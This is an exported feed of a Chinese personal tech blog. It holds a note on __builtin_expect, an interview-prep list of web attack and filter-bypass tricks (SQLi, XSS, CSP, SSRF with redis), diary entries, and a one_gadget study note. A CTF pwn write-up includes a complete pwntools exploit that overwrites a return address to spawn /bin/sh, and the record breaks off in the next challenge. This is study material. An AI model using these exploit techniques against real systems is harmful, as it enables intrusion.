        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">*</span>hook<span class="token punctuation">)</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> <span class="token function">RETURN_ADDRESS</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我开始以为这个if里的东西是和<code>builtin_expect</code>的第二个参数有关系</p>
<p>但查找后发现是</p>
<p><code>__builtin_expect(long EXP, long C)</code>是返回<code>EXP</code>的,不是返回<code>EXP</code>和<code>C</code>比较结果</p>
<p>这个函数是说<code>EXP == C</code>的可能性比<code>EXP != C</code>的可能性大, 然后编译器可以通过这个对代码进行优化之类的操作</p>
<p>只是我们预测<code>EXP</code>就是<code>C</code></p>
<p>就比如上面代码中</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">__builtin_expect</span><span class="token punctuation">(</span>hook <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>等效为…就只是看<code>__builtin_expect</code>第一个参数</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span>hook <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>而只是更可能有</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token punctuation">(</span>hook <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>
<span class="token comment" spellcheck="true">// 就是hook通常是NULL, 编译器就可以通过这一点来优化代码</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>还有就是hexo这里,如果标题里有俩斜杠,就看造成代码高亮有问题…</p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[旧物 | 以前面试前的一点小总结]]></title>
      <url>/2018/06/27/%E6%97%A7%E7%89%A9-%E4%BB%A5%E5%89%8D%E9%9D%A2%E8%AF%95%E5%89%8D%E7%9A%84%E4%B8%80%E7%82%B9%E5%B0%8F%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>以前的东西…比较中2…收拾东西的时候翻出来, 发到这里就把本地的删掉了..</p>
<h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞?"></a>逻辑漏洞?</h2><p>固定会话攻击? 登录之后没有换掉session id<br>越权, 改别人密码, 验证做的不好?</p>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>过滤关键词, 看能不能大小写啊, 循环(穿插)替换<br>条件注释, 浮点数, 单引号(在可以出现别名的时候)作为注释<br>等号没了用like<br>时间盲住函数没了可以用比较耗时的操作<br>空格没了用其他空白字符代替, 用注释代替, 用括号代替<br>等等…<br>喔, 还有 DNS 带外的</p>
<h3 id="SQLi的危害"><a href="#SQLi的危害" class="headerlink" title="SQLi的危害"></a>SQLi的危害</h3><p>拿shell, 提权</p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>类型, 反射型, 存储型, DOM型</p>
<p>DOM型一般是说不过Server端, 而反射型过Server端</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 反射型</span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 

<span class="token comment" spellcheck="true">// DOM型</span>
document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>危害: 打cookie, 钓鱼</p>
<h3 id="CSP怎么过"><a href="#CSP怎么过" class="headerlink" title="CSP怎么过"></a>CSP怎么过</h3><p>prefetch系列<br>a模拟鼠标点击<br>直接打开新的页面location.href之类的<br>sourceMap</p>
<h3 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤"></a>过滤</h3><p>编码, 这个其实更复杂的涉及到浏览器的解析规则<br>使用其他能够触发的标签<br>使用一些黑科技, 比如某些奇怪的带圈的数字会被转换为数字, 可以用于ip过滤<br>英文句号没了可以用中文句号<br>http被过滤了, Linux可以直接用<code>//</code>, windows下<code>//</code>应该是当前协议<br>单引号被过滤了, 可以fromCharCode, or 使用反引号(es6新技能)<br>宽字节, 比如%aa, 这个时候通常会看到页面编码是gbk之类的</p>
<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>看一下MDN上的资料, 回宿舍再补起来<br>还有柠檬牛的博客<br>哎, 感觉事情好多啊</p>
<p>好像是localhost和127.0.0.1都不同源<br>端口, 协议, 域名, 那path到底算吗(好像不算)</p>
<h3 id="更改domain"><a href="#更改domain" class="headerlink" title="更改domain"></a>更改domain</h3><p><code>document.domain</code> 可以设置为当前域or父域</p>
<h3 id="img等标签"><a href="#img等标签" class="headerlink" title="img等标签"></a>img等标签</h3><blockquote>
<p>img script style等标签，都允许垮域引用资源，严格说这都是不符合同源要求的。然而，你也只能是引用这些资源而已，并不能读取这些资源的内容<br>上面的话来源于网络…</p>
</blockquote>
<h3 id="ajax-CORS解决跨域"><a href="#ajax-CORS解决跨域" class="headerlink" title="ajax - CORS解决跨域"></a>ajax - CORS解决跨域</h3><p>如果不同源的话, 请求能发起, 但不能读到返回的内容, 为什么呢…<br>这个同源策略是要保护Server还是保护Client<br>你说保护Server吧…我curl能获取数据, 应该是数据到了浏览器了已经, 只是浏览器在响应头<code>Access-Control-Allow-Origin</code>这一项里没找到自己, 所以不读取内容<br>你说保护Client吧, 只要在Server加上一个头就行了…</p>
<h3 id="jsonp解决跨域"><a href="#jsonp解决跨域" class="headerlink" title="jsonp解决跨域"></a>jsonp解决跨域</h3><p>我上次没答上来<br>jsonp也是解决跨域的一种方案</p>
<h3 id="PostMessage解决跨域"><a href="#PostMessage解决跨域" class="headerlink" title="PostMessage解决跨域"></a>PostMessage解决跨域</h3><h2 id="跨域的一些不理解的地方"><a href="#跨域的一些不理解的地方" class="headerlink" title="跨域的一些不理解的地方"></a>跨域的一些不理解的地方</h2><p>其实很多地方不理解, 在MDN上是这样子列的</p>
<ul>
<li>跨源网络访问, ajax啊之类的</li>
<li>跨源数据存储访问, localhostStorage, IndexedDB</li>
</ul>
<p>喔, 这样子, 还有提到一点, cookie使用不同的源的定义方式, 就是, 一个页面可以为本域或者任何父域设置cookie, 任何不包括<code>.com</code>之类的, 是至少是<code>b.com</code>, <code>a.b.com</code><br>这一点在0ctf 2017里遇到过</p>
<p>一般Web中说的同源策略里是protocal, domain, port<br>一般Web中说的同源策略里域和他的子域是算不同源的<br>一般Web中说的同源策略里http和https是不同源的<br>那么意思是和path无关?</p>
<p>Cookie中同源是不区分端口和协议的, 仅仅以domain 还有 path作为同源限制<br>这里的domain是子域可以写cookie到父域的向上通配<br>这里的path是向下通配<br>所以访问子域的时候还会带上父域的cookie</p>
<p>由于…Web的同源策略不看path, 所以…<br>常用的iframe读子path的cookie是应该就是这样子一种操作<br>在父path下本来是读不到子path的cookie的, 这样子一来就解决了<br>注意: 这里是跨path, 不是跨domain<br>父子domain之间除非通过设置同样的<code>document.domain</code>, 不然的话是读不到内容的</p>
<p>找到了一篇关于iframe的文章<code>https://segmentfault.com/a/1190000004502619</code></p>
<p>下载了一份<code>cookie 之困</code></p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>我一直感觉CSRF比较鸡肋…<br>理论上能借用管理员权限?<br>POST型的经常通过表单来伪造, 当然应该也可以用ajax?(小声yy)</p>
<p>Mark一下不太常用的跳转方法</p>
<pre><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=&quot;&gt;
</code></pre><h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><p>这个东西感觉是浏览器自动带上去的…比如我本地一个网页, 然后点击链接, 浏览器就会带上这样的头部…</p>
<pre><code>Referer: http://www.foo.com/refer.html
</code></pre><p>可以通过在<code>refer.html</code>里加入这个</p>
<pre><code>&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;
</code></pre><p>来让由<code>refer.html</code>跳转出去的请求不带Referer头, 那能不能设置头等于什么呢…<br>好像这个不太能</p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>验证码<br>Csrf Token<br>Referer验证</p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>攻击目标一般是从外网无法直接接近的内部系统<br>出现地点: 能发起请求的地方<br>利用效果: 读文件, 信息收集, 打本地应用</p>
<h3 id="IP黑名单绕过"><a href="#IP黑名单绕过" class="headerlink" title="IP黑名单绕过"></a>IP黑名单绕过</h3><p>DNS Rebinding</p>
<h3 id="协议绕过"><a href="#协议绕过" class="headerlink" title="协议绕过"></a>协议绕过</h3><p>302跳转</p>
<h3 id="和redis组合使用"><a href="#和redis组合使用" class="headerlink" title="和redis组合使用"></a>和redis组合使用</h3><p>gophar 和 dict</p>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>最近比较火的<br>处理外部实体数据的时候, 因为实体调用的时候可以访问本地or远程的内容</p>
<h2 id="RPO"><a href="#RPO" class="headerlink" title="RPO"></a>RPO</h2><p>比较新的东西</p>
<h2 id="前端安全的利用感觉就比较困难"><a href="#前端安全的利用感觉就比较困难" class="headerlink" title="前端安全的利用感觉就比较困难"></a>前端安全的利用感觉就比较困难</h2><p>前端安全的这些东西一般都很难单独利用, 大多数是组合出现</p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>基于时间的命令执行</p>
<h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><p>这类的我其实不太关注…其实不怎么了解<br>比如…点击劫持, 覆盖透明层(iframe), 伪造导航栏..<br>最基本的要判断UA, 一般只有手机浏览器才会钓鱼, PC就跳到正常界面了, 因为容易被发现<br>判断 UA 其实不保险, 所以有人判断那个navigator.platform</p>
<h2 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h2><p>扫描器写过没, 没写过, 相关的要点</p>
<h2 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h2><p>读过两本书..感觉怎么说, 内容不太充实<br>《白帽子讲浏览器安全》和《黑客攻防技术宝典:浏览器实战篇》</p>
<h3 id="同源策略-1"><a href="#同源策略-1" class="headerlink" title="同源策略"></a>同源策略</h3><p>浏览器中最重要的安全策略就是同源策略, 如果能有那种交叉引用就好了, 把我上面那个同源策略引入过来…算了, 还是在上面讲吧</p>
<h3 id="渲染引擎"><a href="#渲染引擎" class="headerlink" title="渲染引擎"></a>渲染引擎</h3><p>其实比较复杂了感觉, 算二进制的范畴了, 真的是感觉跨越web和pwn的大佬才搞得懂</p>
<h3 id="移动端"><a href="#移动端" class="headerlink" title="移动端"></a>移动端</h3><p>移动端伪造比较容易, 控制比较难</p>
<h2 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h2><h2 id="漏洞相关"><a href="#漏洞相关" class="headerlink" title="漏洞相关"></a>漏洞相关</h2><h3 id="怎么评级"><a href="#怎么评级" class="headerlink" title="怎么评级"></a>怎么评级</h3><h2 id="APT"><a href="#APT" class="headerlink" title="APT"></a>APT</h2><p>APT是啥?<br>Advanced Persistent Threat<br>高级持续性威胁<br>这玩意的概念…真是…捉摸不透<br>就复习了一下域环境搭建, 这玩意工具一大堆…等我有时间了研究</p>
<h2 id="发出请求"><a href="#发出请求" class="headerlink" title="发出请求"></a>发出请求</h2><pre class="line-numbers language-javascript"><code class="language-javascript">location<span class="token punctuation">.</span>href
xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// ajax</span>
window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
xxx<span class="token punctuation">.</span>src
a<span class="token punctuation">.</span>href <span class="token operator">+</span> a<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;meta http-equiv="refresh" content="0; url=">'</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[一个普通的晚上]]></title>
      <url>/2018/05/31/%E4%B8%80%E4%B8%AA%E6%99%AE%E9%80%9A%E7%9A%84%E6%99%9A%E4%B8%8A/</url>
      <content type="html"><![CDATA[<p>一个普通的晚上</p>
<p>大家都早就做完了毕设</p>
<p>只有我。。。还在挣扎在毕业的边缘</p>
<p>写着代码。。写着论文。。也许当时应该换题目的</p>
<p>用着atom的vim模式感觉好不爽。。。有些功能用不了的样子</p>
<p>列选择和他的复制粘贴冲突了。。。？所以不能列选择？</p>
<p>开始还以为是插件太老不支持的原因</p>
<p>就打开atom。。。发现插件更新不了</p>
<p>一看是因为原来配置的老代理。。。</p>
<p>用Privoxy 把本地的ss代理转到http。。。结果发现Privoxy配置文件里的listen和forward写错了。。。导致一直报错。。。</p>
<p>改了之后正确了<br>但我的atom能获取到新的插件列表。。。但安装不了。。。</p>
<p>真是忧伤</p>
<p>好像只是部分插件装不上。。</p>
<p>vim插件更新之后, 这个保存命令正常了，开心</p>
<p>vim-mode-plus 可以使用列选择…<br>然后ex-mode就用普通的。不用plus<br>就ok了，超开心的</p>
<p>这个搜索真好看。。。开心到爆炸</p>
]]></content>
      
        <categories>
            
            <category> 日记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[好久不写的日记]]></title>
      <url>/2018/05/24/%E5%A5%BD%E4%B9%85%E4%B8%8D%E5%86%99%E7%9A%84%E6%97%A5%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>诶, 好久不写日记了, 最近真的是好忙好忙. 想起来整个毕设过程真的是艰辛.</p>
<p>明天要早早起来去合肥..想今晚通宵又不敢…看了看已经快两点了,还是睡会儿觉吧.</p>
<p>晚安咯.</p>
]]></content>
      
        <categories>
            
            <category> 日记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[one-gadget 学习]]></title>
      <url>/2018/05/16/one-gadget-%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>正如上次看到的…</p>
<pre><code>ary@ubuntu:~$ one_gadget libc32
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL
</code></pre><p>这个esi的条件就需要可以去满足…<br>然后我还发现…<br>网上的wp他们有的时候是</p>
<pre><code>esi is the address of rw-p area of libc...
</code></pre><p>我通过<code>cat /proc/xxxx/maps</code>是可以得到这个<code>rw-p</code>的地址…可我做题怎么办…</p>
<p>这篇文章是作者的文章<br><a href="https://david942j.blogspot.kr/2017/02/project-one-gadget-in-glibc.html" target="_blank" rel="external">https://david942j.blogspot.kr/2017/02/project-one-gadget-in-glibc.html</a></p>
<p>里面说32bit的情况下用one_gadget就很困难…</p>
<blockquote>
<p>all 32bit one-gadgets will have a constraint that certain register (usually ebx  or esi) points to the GOT area in libc</p>
</blockquote>
<p>之后, 又有一句…</p>
<blockquote>
<p>This constraint seems really tough, since ebx and esi are callee safe in x86, which means their value will be pop-ed back before a routine returns. While in practice, the value of esi  or edi is already be the desired value in main, which was set in __libc_start_main. So this constraint still possible to be satisfied.</p>
</blockquote>
<p>意思是说…虽然ebx和esi一般是<code>callee safe</code>的, 就是说调用函数前总会保护现场之类的吧…<br>然…在<code>__libc_start_main</code>里会把<code>ebx</code>和<code>esi</code>设置成我们想要的值…这样的话…在main函数里使用one_gadget的话就应该能保证这个条件</p>
<p>喔, 这样子…那我把在main里直接使用到的函数的got表修改掉</p>
<p>也有可能不在main里…运气好, 在我走过的函数里…esi一直没被改过, 或者退栈的时候还原回来了</p>
<p>恩..我知道这个意思了<br>之后再把作者的文章看一下…说是用到了符号执行</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[t3sec | pwn]]></title>
      <url>/2018/05/16/t3sec-pwn/</url>
      <content type="html"><![CDATA[<p>河南赛区的前两道题目</p>
<h2 id="brain-stack"><a href="#brain-stack" class="headerlink" title="brain_stack"></a>brain_stack</h2><p>这题开了PIE, 第一反应是看怎么leak程序地址</p>
<p>大概就是…初始时候 tape_ptr -&gt; tape<br>tape_ptr里存的是tape的地址.<br>这个tape里存的是随机的数字.</p>
<p>我们有四个功能</p>
<pre><code>&gt; tape_ptr++
&lt; tape_ptr--
R read tape_ptr[0..3]
W write to tape_ptr[0..3]
</code></pre><p>功能很清晰了…天然的任意地址读写</p>
<p>由于读写指针是tape_ptr, 初始在离tape_ptr本身很近的tape处</p>
<p>所以如果距离比较近, 可以用<code>&gt;</code>or<code>&lt;</code>来一步一步把tape_ptr移过去<br>但如果比较远就不如先移动到tape_ptr, 通过改写tape_ptr来快速指向目的地</p>
<p>这题目有PIE, 但其实获得基址好像也没太大用….<br>因为题目本身的缘故, 只要知道偏移就OK了</p>
<p>大概做法就是leak出buf的地址, 由于buf的地址存在cmd, 所以读cmd就能获得buf地址, 而buf的地址距离函数返回地址偏移<code>9 + 4</code>, IDA里可以看到<br>然后更改返回地址处为<code>p32(system) + padding + p32(&#39;/bin/sh&#39;)</code></p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#encoding: utf-8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#p = remote("127.0.0.1", 11111)</span>
<span class="token comment" spellcheck="true">#libc = ELF("./libc32")</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./brain-stack"</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># context.log_level = 'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span><span class="token string">'-x'</span><span class="token punctuation">,</span><span class="token string">'sh'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>

now_addr <span class="token operator">=</span> <span class="token number">0x0</span>

<span class="token keyword">def</span> <span class="token function">gd</span><span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> a<span class="token punctuation">)</span>
    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>
        raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">r4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"R"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">w4</span><span class="token punctuation">(</span>con<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"W"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>con<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">m_l</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">m_r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">mov2</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> now_addr
    off <span class="token operator">=</span> addr <span class="token operator">-</span> now_addr
    now_addr <span class="token operator">=</span> addr
    <span class="token keyword">if</span> off <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
        off <span class="token operator">=</span> <span class="token operator">-</span>off
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>off<span class="token punctuation">)</span><span class="token punctuation">:</span>
            m_l<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>off<span class="token punctuation">)</span><span class="token punctuation">:</span>
            m_r<span class="token punctuation">(</span><span class="token punctuation">)</span>


tape <span class="token operator">=</span> <span class="token number">0x2040</span>
tape_ptr <span class="token operator">=</span> <span class="token number">0x2038</span>
cmd <span class="token operator">=</span> <span class="token number">0x203c</span>
got_write <span class="token operator">=</span> <span class="token number">0x2024</span>

now_addr <span class="token operator">=</span> tape

<span class="token comment" spellcheck="true"># leak addr_of_cmd</span>
<span class="token comment" spellcheck="true"># cmd -> buf</span>
<span class="token comment" spellcheck="true"># mov to 0x203c</span>
mov2<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>
r4<span class="token punctuation">(</span><span class="token punctuation">)</span>
addr_buf <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"buf: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>addr_buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
ret_addr <span class="token operator">=</span> <span class="token punctuation">(</span>addr_buf <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span>


<span class="token comment" spellcheck="true"># leak addr_of_base</span>
<span class="token comment" spellcheck="true"># mov to 0x2038</span>
mov2<span class="token punctuation">(</span>tape_ptr<span class="token punctuation">)</span>
r4<span class="token punctuation">(</span><span class="token punctuation">)</span>
addr_tape_ptr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
base_addr <span class="token operator">=</span> addr_tape_ptr <span class="token operator">-</span> <span class="token number">0x2038</span>
p<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"base: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>base_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#  这一步其实没啥用</span>
<span class="token comment" spellcheck="true">#gd()</span>

<span class="token comment" spellcheck="true"># leak write@got</span>
mov2<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span>
r4<span class="token punctuation">(</span><span class="token punctuation">)</span>
write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address <span class="token operator">=</span> write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
system_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
bin_sh_addr <span class="token operator">=</span> list<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
p<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"system  = {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"bin_sh  = {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

mov2<span class="token punctuation">(</span>tape_ptr<span class="token punctuation">)</span>
w4<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># the addr want to write</span>
<span class="token comment" spellcheck="true"># 以上两步相当于 mov2(ret_addr), 但直接mov是一步一步...发这么多可能会出问题</span>
<span class="token comment" spellcheck="true"># 试了一下...直接mov2...这么大的for in range 会报错...算了就这样吧</span>
w4<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    m_r<span class="token punctuation">(</span><span class="token punctuation">)</span>
w4<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    m_r<span class="token punctuation">(</span><span class="token punctuation">)</span>
w4<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># p32(system) + p32(0xdeadbeef) + p32("/bin/sh")</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"c"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># trash</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>有人到了这个东西<code>one_gadget</code>…但这里的构造条件, 我该怎么构造</p>
<pre><code>0x3a80c    execve(&quot;/bin/sh&quot;, esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL
</code></pre><p>这第一个条件…我就做不来, 难道还要我<code>pop esi</code>吗…</p>
<h2 id="game4"><a href="#game4" class="headerlink" title="game4"></a>game4</h2><p>这道题也很简单…</p>
<p>大概功能</p>
<pre><code>1. List entries
2. Add entry
3. Edit entry
4. Remove entry
0. Exit
</code></pre><p>结构</p>
<pre class="line-numbers language-c"><code class="language-c">t_entry <span class="token punctuation">{</span>
